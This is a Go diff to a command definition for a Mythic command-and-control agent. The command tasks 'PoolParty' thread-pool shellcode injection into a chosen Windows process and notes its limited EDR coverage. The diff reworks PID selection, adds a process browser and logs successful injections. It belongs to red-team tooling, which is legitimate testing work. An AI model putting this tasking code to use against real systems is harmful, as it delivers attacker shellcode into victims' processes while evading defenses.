@@ -4,6 +4,9 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"strings"
+
+	"path/filepath"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 	"github.com/MythicMeta/MythicContainer/logging"
@@ -16,8 +19,9 @@ func init() {
 		HelpString:          "poolparty-injection",
 		Version:             1,
 		MitreAttackMappings: []string{"T1055"}, // Process Injection
-		SupportedUIFeatures: []string{},
+		SupportedUIFeatures: []string{"process_browser:inject"},
 		Author:              "@galoryber",
+		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "poolpartyinjection_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
 		},
@@ -82,11 +86,12 @@ func init() {
 				},
 			},
 			{
-				Name:             "pid",
-				ModalDisplayName: "Target PID",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
-				Description:      "The process ID to inject shellcode into",
-				DefaultValue:     0,
+				Name:                 "pid",
+				ModalDisplayName:     "Target PID",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:          "The process ID to inject shellcode into",
+				DynamicQueryFunction: getProcessList,
+				DefaultValue:         "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
@@ -102,24 +107,24 @@ func init() {
 			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
 				Success:            true,
 				OpsecPreBlocked:    false,
-				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: PoolParty injection (variant: %s) into PID %d. Abuses Windows Thread Pool internals — novel technique with limited EDR coverage but may trigger on worker factory manipulation.", variant, int(pid)),
+				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: PoolParty injection (variant: %s) into PID %s. Abuses Windows Thread Pool internals — novel technique with limited EDR coverage but may trigger on worker factory manipulation.", variant, pid),
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
 		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
 			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
 				TaskID:              taskData.Task.ID,
 				Success:             true,
 				OpsecPostBlocked:    false,
-				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: PoolParty injection (variant: %s) queued for PID %d. Artifact registered.", variant, int(pid)),
+				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: PoolParty injection (variant: %s) queued for PID %s. Artifact registered.", variant, pid),
 				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -168,7 +173,7 @@ func init() {
 			}
 
 			// Get the target PID
-			pid, err := taskData.Args.GetNumberArg("pid")
+			pid, err := parsePIDFromArg(taskData)
 			if err != nil {
 				logging.LogError(err, "Failed to get PID")
 				response.Success = false
@@ -205,14 +210,14 @@ func init() {
 
 			// Build the display parameters
 			displayParams := fmt.Sprintf("Variant: %d (%s)\nShellcode: %s (%d bytes)\nTarget PID: %d",
-				variant, variantDesc, filename, len(fileContents), int(pid))
+				variant, variantDesc, filename, len(fileContents), pid)
 			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("PoolParty variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, int(pid), len(fileContents)))
+			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("PoolParty variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(fileContents)))
 
 			// Build the actual parameters JSON that will be sent to the agent
 			params := map[string]interface{}{
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
-				"pid":           int(pid),
+				"pid":           pid,
 				"variant":       variant,
 			}
 
@@ -226,6 +231,24 @@ func init() {
 
 			taskData.Args.SetManualArgs(string(paramsJSON))
 
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			if strings.Contains(responseText, "success") || strings.Contains(responseText, "injected") || strings.Contains(responseText, "Success") || strings.Contains(responseText, "Injected") {
+				l := len(responseText)
+				if l > 200 {
+					l = 200
+				}
+				createArtifact(processResponse.TaskData.Task.ID, "Process Injection", fmt.Sprintf("[poolparty-injection] %s", responseText[:l]))
+			}
 			return response
 		},
 	})
